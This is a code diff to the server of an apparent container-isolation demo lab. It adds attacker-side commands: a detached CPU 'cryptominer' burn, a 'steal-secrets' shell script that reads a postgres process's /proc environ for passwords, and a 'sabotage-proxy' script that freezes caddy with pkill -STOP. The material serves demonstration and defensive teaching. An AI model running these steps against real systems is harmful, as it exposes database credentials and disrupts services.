@@ -9,7 +9,10 @@ import { handler } from './build/handler.js';
 const host = process.env.HOST || '0.0.0.0';
 const port = Number(process.env.PORT || 8080);
 const dataDir = process.env.LAB_DATA_DIR || '/app/data';
+const victimCheckoutUrl = process.env.VICTIM_CHECKOUT_URL || 'http://victim-checkout:3000/checkout';
+const customerProbeIntervalMs = clamp(Number(process.env.CUSTOMER_PROBE_INTERVAL_MS || 750), 250, 5000);
 const monitorSockets = new Set();
+const customerSockets = new Set();
 let memoryHold = [];
 
 const server = createServer((request, response) => {
@@ -18,6 +21,7 @@ const server = createServer((request, response) => {
 
 const terminalServer = new WebSocketServer({ noServer: true });
 const monitorServer = new WebSocketServer({ noServer: true });
+const customerServer = new WebSocketServer({ noServer: true });
 
 server.on('upgrade', (request, socket, head) => {
 	const url = new URL(request.url || '/', `http://${request.headers.host || 'localhost'}`);
@@ -32,6 +36,13 @@ server.on('upgrade', (request, socket, head) => {
 	if (url.pathname === '/ws/monitor') {
 		monitorServer.handleUpgrade(request, socket, head, (websocket) => {
 			monitorServer.emit('connection', websocket, request);
+		});
+		return;
+	}
+
+	if (url.pathname === '/ws/customer') {
+		customerServer.handleUpgrade(request, socket, head, (websocket) => {
+			customerServer.emit('connection', websocket, request);
 		});
 		return;
 	}
@@ -57,12 +68,25 @@ monitorServer.on('connection', (socket) => {
 	});
 });
 
+customerServer.on('connection', (socket) => {
+	customerSockets.add(socket);
+	send(socket, 'customer.config', { url: victimCheckoutUrl });
+	void sendCustomerSample(socket);
+	socket.on('close', () => {
+		customerSockets.delete(socket);
+	});
+});
+
 setInterval(() => {
 	const payload = { runtime: runtimeEvidence() };
 	for (const socket of monitorSockets) {
 		send(socket, 'monitor.evidence', payload);
 	}
 }, 500);
+
+setInterval(() => {
+	void broadcastCustomerSample();
+}, customerProbeIntervalMs);
 
 server.listen(port, host, () => {
 	console.log(`Listening on http://${host}:${port}`);
@@ -91,6 +115,14 @@ async function handleTerminalMessage(socket, raw) {
 			await runMemoryBomb(socket, message.mb);
 		} else if (type === 'cpu-burn') {
 			await runCpuBurn(socket, message.seconds);
+		} else if (type === 'cpu-blast') {
+			await runCpuBlast(socket, message.seconds, message.workers);
+		} else if (type === 'customer-probe') {
+			await runCustomerProbe(socket);
+		} else if (type === 'steal-secrets') {
+			await runStealSecrets(socket);
+		} else if (type === 'sabotage-proxy') {
+			await runSabotageProxy(socket, message.seconds);
 		} else if (type === 'cleanup') {
 			await runCleanup(socket);
 		} else {
@@ -172,7 +204,7 @@ async function runPidBomb(socket, rawCount) {
 }
 
 async function runMemoryBomb(socket, rawMb) {
-	const mb = clamp(Number(rawMb || 128), 1, 1024);
+	const mb = clamp(Number(rawMb || 128), 1, 1536);
 	line(socket, 'system', `$ dokuru-lab memory-bomb --mb ${mb}\n`);
 
 	for (let index = 0; index < mb; index += 1) {
@@ -199,6 +231,72 @@ async function runCpuBurn(socket, rawSeconds) {
 	});
 }
 
+async function runCpuBlast(socket, rawSeconds, rawWorkers) {
+	const seconds = clamp(Number(rawSeconds || 25), 1, 60);
+	const workers = clamp(Number(rawWorkers || 4), 1, 8);
+	line(socket, 'system', `$ dokuru-lab cryptominer --workers ${workers} --seconds ${seconds}\n`);
+
+	const script = `process.title='dokuru_cpu_burn'; const crypto = require('node:crypto'); const end = Date.now() + ${seconds} * 1000; let ops = 0; while (Date.now() < end) { for (let i = 0; i < 5000; i++) crypto.createHash('sha256').update(String(ops++)).digest('hex'); }`;
+	let spawned = 0;
+
+	for (let index = 0; index < workers; index += 1) {
+		try {
+			const child = spawn(process.execPath, ['-e', script], { detached: true, stdio: 'ignore' });
+			child.unref();
+			spawned += 1;
+			line(socket, 'stdout', `[miner ${index + 1}/${workers}] pid=${child.pid}\n`);
+		} catch (error) {
+			line(socket, 'stderr', `failed to spawn miner ${index + 1}: ${error instanceof Error ? error.message : String(error)}\n`);
+		}
+	}
+
+	await delay(250);
+	line(socket, 'stdout', `spawned ${spawned}/${workers} CPU miners for ${seconds}s; watch Customer Live View for latency spikes\n`);
+	line(socket, 'stdout', cgroupSummary());
+}
+
+async function runCustomerProbe(socket) {
+	line(socket, 'system', `$ curl -sS -m 2 ${victimCheckoutUrl}\n`);
+	const sample = await directCustomerProbe();
+	if (sample.ok) {
+		line(socket, 'stdout', `customer OK status=${sample.status} latency=${sample.latency_ms}ms body=${sample.body}\n`);
+	} else {
+		line(socket, 'stderr', `customer FAIL status=${sample.status} latency=${sample.latency_ms}ms error=${sample.error}\n`);
+	}
+}
+
+async function runStealSecrets(socket) {
+	const command = [
+		'set -eu',
+		"echo '[1] visible postgres processes from inside attacker container'",
+		"ps -eo pid,user,comm,args | grep -E '[p]ostgres|[v]ictim-secrets' | head -20 || true",
+		"pid=$(pgrep -of 'postgres' || true)",
+		"if [ -z \"$pid\" ]; then echo 'no postgres PID visible; PID namespace is isolated'; exit 2; fi",
+		'echo "target_pid=$pid"',
+		"echo '[2] reading /proc/$pid/environ'",
+		"if [ ! -e \"/proc/$pid/environ\" ]; then echo 'environ file missing'; exit 3; fi",
+		"tr '\\0' '\\n' < \"/proc/$pid/environ\" | grep -E 'POSTGRES|PASSWORD|USER|DB' || true"
+	].join('\n');
+
+	await runShell(socket, command, 8_000);
+}
+
+async function runSabotageProxy(socket, rawSeconds) {
+	const seconds = clamp(Number(rawSeconds || 6), 3, 15);
+	const command = [
+		'set -u',
+		`echo '[1] scheduling automatic caddy resume in ${seconds}s'`,
+		`(sleep ${seconds}; pkill -CONT -x caddy 2>/dev/null || true; echo 'auto-resume attempted at '$(date -Is)) >/tmp/dokuru-caddy-resume.log 2>&1 &`,
+		"echo '[2] stopping caddy from inside the attacker container'",
+		'pkill -STOP -x caddy',
+		'code=$?',
+		"if [ \"$code\" -eq 0 ]; then echo 'caddy stopped; browser may disconnect until auto-resume runs'; else echo 'no caddy process visible; PID namespace is likely isolated'; fi",
+		'exit 0'
+	].join('\n');
+
+	await runShell(socket, command, 4_000);
+}
+
 async function runCleanup(socket) {
 	line(socket, 'system', 'dropping held memory buffers in the server process\n');
 	memoryHold = [];
@@ -208,6 +306,100 @@ async function runCleanup(socket) {
 		5_000
 	);
 	line(socket, 'stdout', `held memory cleared; ${cgroupSummary()}`);
+}
+
+async function broadcastCustomerSample() {
+	if (customerSockets.size === 0) return;
+	const sample = await customerProbe();
+	for (const socket of customerSockets) {
+		send(socket, 'customer.sample', { sample });
+	}
+}
+
+async function sendCustomerSample(socket) {
+	const sample = await customerProbe();
+	send(socket, 'customer.sample', { sample });
+}
+
+async function customerProbe() {
+	const trafficSample = customerTrafficSample();
+	if (trafficSample) return trafficSample;
+	return directCustomerProbe();
+}
+
+async function directCustomerProbe() {
+	const started = Date.now();
+	const controller = new AbortController();
+	const timeout = setTimeout(() => controller.abort(), 1800);
+
+	try {
+		const response = await fetch(victimCheckoutUrl, { signal: controller.signal });
+		const body = (await response.text()).trim().slice(0, 240);
+		return {
+			ok: response.ok,
+			status: response.status,
+			latency_ms: Date.now() - started,
+			url: victimCheckoutUrl,
+			body
+		};
+	} catch (error) {
+		return {
+			ok: false,
+			status: 'ERR',
+			latency_ms: Date.now() - started,
+			url: victimCheckoutUrl,
+			error: error instanceof Error ? error.message : String(error)
+		};
+	} finally {
+		clearTimeout(timeout);
+	}
+}
+
+function customerTrafficSample() {
+	const path = join(dataDir, 'customer-traffic.log');
+
+	try {
+		const lines = readFileSync(path, 'utf8')
+			.trim()
+			.split('\n')
+			.filter(Boolean);
+		const latest = lines.at(-1);
+		if (!latest) return null;
+
+		const match = /^(\S+)\s+status=([^\s]+)\s+latency_s=([0-9.]+)(?:\s+error=(.*))?$/.exec(latest);
+		if (!match) return null;
+
+		const observedAt = match[1];
+		const statusText = match[2];
+		const latencyMs = Math.round(Number(match[3]) * 1000);
+		const status = /^\d+$/.test(statusText) ? Number(statusText) : statusText;
+		const timestamp = Date.parse(observedAt);
+		const ageMs = Number.isFinite(timestamp) ? Date.now() - timestamp : 0;
+
+		if (ageMs > 5000) {
+			return {
+				ok: false,
+				status: 'STALE',
+				latency_ms: ageMs,
+				url: victimCheckoutUrl,
+				source: 'customer-traffic',
+				observed_at: observedAt,
+				error: `customer-traffic sample is stale (${ageMs}ms old)`
+			};
+		}
+
+		return {
+			ok: typeof status === 'number' && status >= 200 && status < 400,
+			status,
+			latency_ms: Number.isFinite(latencyMs) ? latencyMs : 0,
+			url: victimCheckoutUrl,
+			source: 'customer-traffic',
+			observed_at: observedAt,
+			error: match[4]
+		};
+	} catch {
+		return null;
+	}
 }
 
 function runtimeEvidence() {
